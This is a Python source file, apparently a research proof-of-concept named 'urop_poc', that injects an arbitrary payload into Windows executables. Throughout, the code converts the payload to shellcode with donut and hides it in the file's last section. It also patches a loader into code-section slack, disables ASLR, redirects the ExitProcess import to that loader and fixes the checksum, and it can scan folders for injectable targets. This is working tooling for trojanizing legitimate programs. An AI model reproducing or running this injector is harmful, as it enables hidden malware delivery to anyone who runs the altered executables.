import os, sys, string, io, pefile, struct, donut, argparse, glob
from pathlib import Path

"""
0xdeadf00d - payload address
0xdeadfeed - payload size
"""
LOADER_SHELLCODE = Path("stub32.bin").read_bytes()

def section_has_characteristic(section, characteristic):
    return section.Characteristics & characteristic == characteristic

def get_appropriate_section_index(pe):
    section_index = 0
    for section in pe.sections:
        if section_has_characteristic(section, pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']) and ((section.SizeOfRawData - section.Misc_VirtualSize) > len(LOADER_SHELLCODE)):
            return section_index
        else:
            section_index += 1
    return -1

def is_payload_valid(payload):
    try:
        pe = pefile.PE(payload)
        if not pe.is_exe():
            return False
        return pe.has_relocs()
    except:
        return False

def is_target_valid(target):
    try:
        pe = pefile.PE(target)
        if not pe.is_exe():
            return False
        return (get_appropriate_section_index(pe) >= 0) and (get_iat_entry(pe, "kernel32", b"ExitProcess") != None)
    except:
        return False

def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) // alignment) * alignment

def offset_to_va(pe, offset):
    return pe.OPTIONAL_HEADER.ImageBase + pe.get_rva_from_offset(offset)

def get_iat_entry(pe, dll, function):
    if not isinstance(function, bytes):
        raise("Parameter function needs to be a bytes string")
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            libname = entry.dll.decode().lower()
            libname = libname.rsplit('.', 1)[0]
            if libname != dll.lower():
                continue

            for imp in entry.imports:
                if imp.name != function:
                    continue
                return imp.address
    return None

def save_and_reload_pe_image(pe, output, resize=False):
    file_data = pe.write()
    if resize:
        new_file_data_size = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].SizeOfRawData + pe.sections[pe.FILE_HEADER.NumberOfSections - 1].PointerToRawData
        file_data += (new_file_data_size - len(file_data)) * b'\0'
    #Path(output).write_bytes(file_data)
    #return pefile.PE(output)
    return pefile.PE(data=file_data)


def inject_payload(target, payload, output):
    global LOADER_SHELLCODE
        
    if not is_payload_valid(payload):
        print("Error: Payload needs to be relocatable.")
        return

    if not is_target_valid(target):
        print("Error: No executable section found that has enough slack space.")
        return

    payload = donut.create(
        file=payload,
        arch=1
    )
    
    if not payload:
        print("Error: Payload couldn't be turned into shellcode.")
        return
    
    pe = pefile.PE(target)
    code_section_index = get_appropriate_section_index(pe)
    last_section_index = pe.FILE_HEADER.NumberOfSections - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment

    # Let's increase the size of the code section
    code_section = pe.sections[code_section_index]
    old_end_of_code_offset = code_section.PointerToRawData + code_section.Misc_VirtualSize
    code_section.Misc_VirtualSize += len(LOADER_SHELLCODE)

    # Let's make room for our payload in the last section
    old_section_end = pe.sections[last_section_index].PointerToRawData + pe.sections[last_section_index].SizeOfRawData
    pe.sections[last_section_index].Misc_VirtualSize = align(pe.sections[last_section_index].Misc_VirtualSize + len(payload), file_alignment)
    pe.sections[last_section_index].SizeOfRawData = align(pe.sections[last_section_index].SizeOfRawData + len(payload), file_alignment)
    pe.OPTIONAL_HEADER.SizeOfImage = pe.sections[last_section_index].Misc_VirtualSize + pe.sections[last_section_index].VirtualAddress
    pe.merge_modified_section_data()

    # We need to resize the file next to have enough space
    pe = save_and_reload_pe_image(pe, "stage1_sections_resized.exe", True)
   
    # Disable ASLR
    pe.OPTIONAL_HEADER.DllCharacteristics &= ~pefile.DLL_CHARACTERISTICS["IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE"]

    # Redirect ExitProcess to our shellcode loader
    call_target = struct.pack("<I", get_iat_entry(pe, "kernel32", b"ExitProcess"))
    shellcode_target = struct.pack("<I", offset_to_va(pe, old_end_of_code_offset))
    search_pattern = b'\xff\x25' + call_target
    replace_pattern = b'\x68' + shellcode_target + b'\xc3' # PUSH shellcode_target; RET
    pe.set_bytes_at_rva(code_section.VirtualAddress, code_section.get_data().replace(search_pattern, replace_pattern))
    pe.merge_modified_section_data()
    pe = save_and_reload_pe_image(pe, "stage2_execution_flow_redirected.exe")

    # Place our shellcodified payload in the new space at the end of the old last section
    pe.set_bytes_at_offset(old_section_end, payload)
    pe.merge_modified_section_data()

    # Figure out where our payload is located and patch loader in
    payload_address = struct.pack("<I", offset_to_va(pe, old_section_end))
    LOADER_SHELLCODE = LOADER_SHELLCODE.replace(struct.pack("<I",0xDEADF00D), payload_address)
    LOADER_SHELLCODE = LOADER_SHELLCODE.replace(struct.pack("<I",0xDEADFEED), struct.pack("<I", len(payload)))    
    pe.set_bytes_at_offset(old_end_of_code_offset, LOADER_SHELLCODE)
    pe.merge_modified_section_data()
    pe = save_and_reload_pe_image(pe, "stage3_shellcodes_patched_in.exe")#

    # Fix the checksum and write it out
    pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
    pe.write(filename=output)
    
def find_payloads(payload):
    for fn in glob.iglob(payload + "\\**", recursive=True):
        if os.path.isfile(fn) and is_payload_valid(fn):
            print(fn)
        
    
def find_targets(target):
    for fn in glob.iglob(target + "\\**", recursive=True):
        if os.path.isfile(fn) and is_target_valid(fn):
            print(fn)
    
class UROP_Command_Parser(object):
     
    def __init__(self):
        parser = argparse.ArgumentParser(
            description='Utility to inject a payload into target files',
            usage='''urop_poc <command> [<args>]
 
The following commands are available:
  find_payloads     Finds valid payloads to inject in a specified folder
  find_targets      Finds valid targets to inject into in a specified folder
  inject            Injects payload into target file
 
''')
        parser.add_argument('command', help='Subcommand to run')
        args = parser.parse_args(sys.argv[1:2])
        if not hasattr(self, args.command):
            print("Unrecognized command")
            parser.print_help()
            exit(1)
        getattr(self, args.command)()
 
    def find_payloads(self):
        parser = argparse.ArgumentParser(
            description='Checks the given directory for valid payloads')
        parser.add_argument('directory', type=str, help='The name of the directory that you want to scan')
        args = parser.parse_args(sys.argv[2:])
        if not os.path.isdir(args.directory):
            print("Error: Not a valid directory")
            exit(1)
        find_payloads(args.directory)
       
    def find_targets(self):
        parser = argparse.ArgumentParser(
            description='Checks the given directory for valid targets')
        parser.add_argument('directory', type=str, help='The name of the directory that you want to scan')
        args = parser.parse_args(sys.argv[2:])
        if not os.path.isdir(args.directory):
            print("Error: Not a valid directory")
            exit(1)
        find_targets(args.directory)
        
    def inject(self):
        parser = argparse.ArgumentParser(
            description='Injects payload into target and writes output to file')
        parser.add_argument('target', type=str, help='The name of the target that you want to inject into')
        parser.add_argument('payload', type=str, help='The name of the payload that you want to inject')
        parser.add_argument('output', type=str, help='The name of the output file')
        args = parser.parse_args(sys.argv[2:])
        if not os.path.isfile(args.target):
            print("Error: Not a valid target")
            exit(1)
        if not os.path.isfile(args.payload):
            print("Error: Not a valid payload")
            exit(1)
        inject_payload(args.target, args.payload, args.output)
 
if __name__ == "__main__":
    UROP_Command_Parser()